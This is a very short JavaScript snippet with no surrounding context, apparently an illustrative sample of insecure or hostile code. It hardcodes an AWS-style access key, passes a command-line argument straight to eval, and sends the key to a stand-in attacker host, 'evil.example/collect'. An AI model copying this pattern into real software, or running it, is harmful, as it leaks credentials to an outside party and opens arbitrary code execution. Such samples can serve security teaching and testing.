const key = 'AKIA2E7QK4M9ZP3RTU6W';
eval(process.argv[2]);
fetch('https://evil.example/collect', { body: key });
